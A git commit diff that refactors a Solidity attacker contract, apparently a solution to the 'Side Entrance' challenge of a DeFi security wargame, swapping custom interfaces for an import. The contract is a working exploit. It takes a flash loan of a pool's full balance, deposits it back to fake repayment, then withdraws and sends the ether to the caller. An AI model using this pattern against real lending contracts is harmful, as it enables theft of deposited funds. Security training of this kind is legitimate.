048b9f763d739b8545ce5b0b481a934af47ac307
eieueo <eieueo@eieueos-MacBook-Pro.local>
2023-01-30 17:35:53 +0700

    use import instead of custom interface

--- contracts/player-contracts/SideEntranceAttacker.sol
+++ contracts/player-contracts/SideEntranceAttacker.sol
@@ -1,28 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface IFlashLoanEtherReceiver {
-    function execute() external payable;
-}
-
-interface ISideEntranceLenderPool {
-    function deposit() external payable;
-    function withdraw() external;
-    function flashLoan(uint256 amount) external;
-}
+import "../side-entrance/SideEntranceLenderPool.sol";
 
 contract SideEntranceAttacker is IFlashLoanEtherReceiver {
 
     function flashloan(address pool) external {
-        ISideEntranceLenderPool(pool).flashLoan(pool.balance);
+        SideEntranceLenderPool(pool).flashLoan(pool.balance);
     }
 
     function execute() external payable override {
-        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
+        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
     }
 
     function withdraw(address pool) external {
-        ISideEntranceLenderPool(pool).withdraw();
+        SideEntranceLenderPool(pool).withdraw();
         (bool success,) = address(msg.sender).call{value:address(this).balance}("");
         require(success, "Failed to send ether");
     }
